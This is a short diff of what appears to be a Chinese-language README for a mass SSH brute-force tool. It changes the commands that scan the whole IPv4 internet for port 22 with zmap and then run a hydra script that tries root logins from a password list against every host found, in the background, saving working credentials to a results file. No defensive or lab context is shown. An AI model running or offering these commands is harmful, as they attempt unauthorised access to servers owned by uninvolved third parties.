@@ -7,8 +7,8 @@
 	zmap -p 22 0.0.0.0/0 -N 10000 -o ssh.txt
 
   ### 运行项目
-
-  	nohup ./hydra.sh ssh.txt root pass.txt 150 res.txt > hydra.log &
+  	zmap -p 22 0.0.0.0/0 -N 1000 -o ssh.txt -i ens32 && nohup ./hydra.sh ssh.txt root pass.txt 50 res.txt > hydra.log &
+  	nohup ./hydra.sh ssh.txt root pass.txt 50 res.txt > hydra.log &
 
   ### 查看运行详情
 
